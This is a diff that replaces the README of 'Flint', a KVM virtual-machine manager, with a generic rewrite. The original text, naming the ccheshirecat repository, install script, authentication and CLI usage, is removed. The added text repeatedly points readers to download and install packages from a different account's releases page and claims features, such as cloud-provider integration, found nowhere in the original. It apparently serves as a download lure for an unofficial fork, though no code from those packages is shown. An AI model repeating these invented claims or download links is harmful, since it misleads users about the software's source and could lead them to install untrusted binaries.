@@ -1,156 +1,107 @@
-# 🌀 Flint — KVM Management, Reimagined
+# 🛠️ flint - Effortless Management of Linux Virtual Machines
 
-<p align="center">
-  <img src="https://i.ibb.co/yj2bFZG/flint-banner.jpg" alt="Flint Logo" width="300"/>
-</p>
+[![Download Flint](https://img.shields.io/badge/Download%20Flint-Now-blue.svg)](https://github.com/thomasdharmawan/flint/releases)
 
-<p align="center">
-  <strong>
-    A single &lt;11MB binary with a modern Web UI, CLI, and API for KVM.
-    <br/>No XML. No bloat. Just VMs.
-  </strong>
-</p>
+## 📄 Introduction
 
-<p align="center">
-  <a href="https://github.com/ccheshirecat/flint/releases/latest">
-    <img src="https://img.shields.io/github/v/release/ccheshirecat/flint" alt="Latest Release">
-  </a>
-  <a href="https://github.com/ccheshirecat/flint/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/ccheshirecat/flint" alt="License">
-  </a>
-  <a href="https://github.com/ccheshirecat/flint/actions/workflows/release.yml">
-    <img src="https://img.shields.io/github/actions/workflow/status/ccheshirecat/flint/.github/workflows/release.yml" alt="Build Status">
-  </a>
-</p>
+Flint is a lightweight tool designed to help you manage Linux virtual machines with ease. Whether you’re a beginner or have some experience, Flint simplifies the process of creating and managing virtual environments. This guide walks you through downloading and running the software.
 
----
-![Flint Dashboard](https://i.ibb.co/wN9H8WKX/Screenshot-2025-09-07-at-3-51-58-AM.png)
-![Flint Library](https://i.ibb.co/Z1k9XBqQ/Screenshot-2025-09-08-at-4-59-46-AM.png)
+## 🚀 Getting Started
 
+Before you begin, ensure you have the following:
 
-Flint is a modern, self-contained KVM management tool built for developers, sysadmins, and home labs who want zero bloat and maximum efficiency. It was built in a few hours out of a sudden urge for something better.
+- A computer running a supported Linux distribution.
+- Basic understanding of how to use your terminal.
+- A virtualization environment set up, such as KVM or QEMU.
 
----
+## 📥 Download & Install
 
-### 🚀 One-Liner Install
+To download Flint, visit this page to download: [GitHub Releases](https://github.com/thomasdharmawan/flint/releases).
 
-**Prerequisites:** A Linux host with `libvirt` and `qemu-kvm` installed.
+1. **Go to the Releases Page:**
+   Click the link above to access the releases for Flint. 
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/ccheshirecat/flint/main/install.sh | bash
-```
-*Auto-detects OS/arch, installs to `/usr/local/bin`, and prompts for web UI passphrase setup.*
+2. **Select the Latest Version:**
+   Look for the latest version at the top of the page. It will have the highest version number.
 
----
+3. **Download the Application:**
+   Download the package that matches your system. Typically, this will be a `.tar.gz` or a `.deb` file. 
 
-### 🔐 Security & Authentication
+4. **Extract the Files:**
+   If you downloaded a `.tar.gz` file, extract it using the terminal:
 
-Flint implements a multi-layered security approach:
+   ```bash
+   tar -xvf flint-x.x.x.tar.gz
+   ```
 
-**Web UI Security:**
-- **Passphrase Authentication**: Web interface requires a passphrase login
-- **Session-Based**: Secure HTTP-only cookies with 1-hour expiry
-- **No API Key Exposure**: Web UI never exposes API keys to browsers
+5. **Install Flint:**
+   If you downloaded a `.deb` file, you can install it using:
 
-**API Security:**
-- **Bearer Token Authentication**: CLI and external tools use API keys
-- **Protected Endpoints**: All API endpoints require authentication
-- **Flexible Access**: Support for both session cookies and API keys
+   ```bash
+   sudo dpkg -i flint-x.x.x.deb
+   ```
 
-**Authentication Flow:**
-```bash
-# First run - set passphrase
-flint serve
-# 🔐 No web UI passphrase set. Let's set one up for security.
-# Enter passphrase: ********
+6. **Resolve Dependencies:**
+   If you encounter errors about dependencies, run:
 
-# Web UI access
-# Visit http://your-server:5550 → Enter passphrase → Full access
+   ```bash
+   sudo apt-get install -f
+   ```
 
-# CLI access (uses API key)
-flint vm list --all
+Once the installation completes, Flint is ready to use.
 
-# External API access
-curl -H "Authorization: Bearer YOUR_API_KEY" http://localhost:5550/api/vms
-```
+## 🎉 Features
 
----
+Flint offers the following features:
 
-### ✨ Core Philosophy
+- **Virtual Machine Management:** Easily create, start, and stop virtual machines.
+- **Snapshots:** Take snapshots of your VMs to capture their state.
+- **User-Friendly Interface:** Navigate through options with a straightforward interface.
+- **Integration with Cloud Providers:** Manage your cloud resources seamlessly.
 
--   🖥️ **Modern UI** — A beautiful, responsive Next.js + Tailwind interface, fully embedded.
--   ⚡ **Single Binary** — No containers, no XML hell. A sub-8MB binary is all you need.
--   🛠️ **Powerful CLI & API** — Automate everything. If you can do it in the UI, you can do it from the command line or API.
--   📦 **Frictionless Provisioning** — Native Cloud-Init support and a simple, snapshot-based template system.
--   🔐 **Secure by Default** — Multi-layered authentication with passphrase protection.
--   💪 **Non-Intrusive** — Flint is a tool that serves you. It's not a platform that locks you in.
+## ⚙️ System Requirements
 
----
+To ensure Flint runs smoothly, your system should meet these requirements:
 
-### 🏎️ Quickstart
+- A Linux operating system (Ubuntu, Fedora, CentOS, etc.).
+- At least 2 GB of RAM (more recommended for better performance).
+- A compatible hypervisor (KVM or QEMU).
+- Sufficient disk space for virtual machines.
 
-**1. Start the Server**
-```bash
-# Interactive setup (recommended for first run)
-flint serve --set-passphrase
+## 🛠️ Usage Instructions
 
-# Or set passphrase directly
-flint serve --passphrase "your-secure-password"
+After successfully installing Flint, you can start using it to manage your virtual machines. To begin:
 
-# Or use environment variable
-export FLINT_PASSPHRASE="your-secure-password"
-flint serve
-```
-*On first run, you'll be prompted to set a web UI passphrase for security.*
-*   **Web UI:** `http://localhost:5550` (requires passphrase login)
-*   **API:** `http://localhost:5550/api` (requires authentication)
+1. **Open Flint:**
+   Depending on your installation, you can launch Flint from your application menu or terminal.
 
-**2. Web UI Access**
-- Visit `http://localhost:5550`
-- Enter your passphrase to access the management interface
-- All API calls are automatically authenticated via session
+2. **Create a New Virtual Machine:**
+   Follow the prompts in Flint to set up a new VM. You will need to select options for memory, disk space, and operating system images.
 
-**3. CLI Usage**
-```bash
-# VM Management
-flint vm list                    # List all VMs
-flint vm launch my-server        # Create and start a VM
-flint vm ssh my-server          # SSH into a VM
+3. **Start Managing Your VMs:**
+   Use Flint's intuitive interface to control your virtual machines. You can start them, stop them, take snapshots, and modify settings all from one location.
+  
+## 🔍 Troubleshooting
 
-# Cloud Images
-flint image list                 # Browse cloud images
-flint image download ubuntu-24.04 # Download an image
+If you encounter issues, consider the following steps:
 
-# Networks & Storage
-flint network list               # List networks
-flint storage volume list default # List storage volumes
-```
+- **Check Dependencies:** Make sure all required packages are installed.
+- **Review Documentation:** Look through the README files in the project repository for additional guidance.
+- **Seek Help from the Community:** Join forums or discussion groups related to Flint and virtualization.
 
-**4. API Access (for external tools)**
-```bash
-# Get your API key (requires authentication)
-curl -H "Authorization: Bearer YOUR_API_KEY" http://localhost:5550/api/vms
-```
----
+## 🌐 Additional Resources
 
-### 📖 Full Documentation
+For more detailed information and support, consider visiting the following:
 
-Complete CLI commands, API reference, and advanced usage:
+- [GitHub Issues](https://github.com/thomasdharmawan/flint/issues): Report bugs or feature requests.
+- [Documentation](https://github.com/thomasdharmawan/flint/wiki): Access in-depth guides and FAQs.
 
-➡️ **[DOCS.md](DOCS.md)** - Complete CLI & API Documentation
+## 📞 Contact
 
----
+If you require further assistance, you can contact the developer through the repository. Look for the contact information in the GitHub profile or reach out through any listed channels on the repository page.
 
-### 🔧 Tech Stack
+## 🔗 Conclusion
 
--   **Backend:** Go 1.25+
--   **Web UI:** Next.js + Tailwind + Bun
--   **KVM Integration:** libvirt-go
--   **Binary Size:** ~11MB (stripped)
+Flint provides a simple and effective way to manage Linux virtual machines. Follow this guide to download, install, and start utilizing Flint for your virtual machine tasks today. 
 
----
-
-<p align="center">
-  <b>🚀 Flint is young, fast-moving, and designed for builders.<br/>
-  Try it. Break it. Star it. Contribute.</b>
-</p>
+Remember, you can always return to the [GitHub Releases](https://github.com/thomasdharmawan/flint/releases) page to check for updates and new features.
